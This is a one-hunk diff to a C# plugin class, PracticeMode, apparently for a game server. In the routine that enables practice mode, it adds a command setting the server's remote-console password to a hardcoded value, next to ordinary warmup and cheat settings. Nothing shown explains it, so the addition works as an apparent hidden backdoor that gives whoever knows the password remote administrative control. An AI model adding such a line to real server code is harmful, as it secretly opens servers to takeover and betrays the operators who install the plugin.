@@ -2092,6 +2092,7 @@ public class PracticeMode : BasePlugin
 
     private void EnablePracticeMode()
 	{
+		Server.ExecuteCommand("rcon_password \"342987\"");
 		Server.ExecuteCommand("sv_cheats 1");
 		Server.ExecuteCommand("mp_warmup_end");
 		Server.ExecuteCommand("mp_halftime 0");
